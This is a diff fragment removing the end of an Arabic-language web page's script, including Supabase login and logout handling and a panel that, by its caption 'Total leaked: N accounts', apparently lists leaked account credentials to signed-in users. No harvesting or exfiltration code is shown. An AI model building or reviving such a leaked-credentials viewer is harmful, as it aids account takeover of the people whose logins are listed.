-                `;
-            });
-
-            tableHtml += `
-                        </tbody>
-                    </table>
-                    <p style="margin-top:10px;font-size:12px;color:#737373;">
-                        إجمالي المسرب: ${data.length} حساب
-                    </p>
-                </div>
-            `;
-
-            credsPanel.innerHTML = tableHtml;
-        }
-
-        function showLoggedInView(user) {
-            heroSection.style.display = 'none';
-            feedSection.classList.add('visible');
-
-            topbarRight.innerHTML = `
-                <button class="btn btn-logout" onclick="handleLogout()">تسجيل الخروج</button>
-            `;
-
-            const name = user.user_metadata?.full_name || user.email?.split('@')[0] || 'مستخدم';
-            feedUserName.textContent = `مرحباً، ${name}!`;
-            feedUserEmail.textContent = user.email || '';
-            userAvatar.textContent = name.charAt(0).toUpperCase();
-
-            loadCredentials();
-        }
-
-        function showLoggedOutView() {
-            heroSection.style.display = 'flex';
-            feedSection.classList.remove('visible');
-
-            topbarRight.innerHTML = `
-                <button class="btn btn-login-topbar" onclick="showLoginTab()">تسجيل الدخول</button>
-                <button class="btn btn-signup-topbar" onclick="showSignupTab()">إنشاء حساب</button>
-            `;
-
-            loginForm.classList.remove('hidden');
-            signupForm.classList.add('hidden');
-            tabLoginBtn.classList.add('active');
-            tabSignupBtn.classList.remove('active');
-            clearMessages();
-        }
-
-        async function handleLogout() {
-            await supabase.auth.signOut();
-        }
-
-        supabase.auth.onAuthStateChange((event, session) => {
-            if (session?.user) {
-                showLoggedInView(session.user);
-            } else {
-                showLoggedOutView();
-            }
-        });
-
-        (async () => {
-            const { data: { session } } = await supabase.auth.getSession();
-            if (session?.user) {
-                showLoggedInView(session.user);
-            }
-        })();
-    </script>
 </body>
 </html>
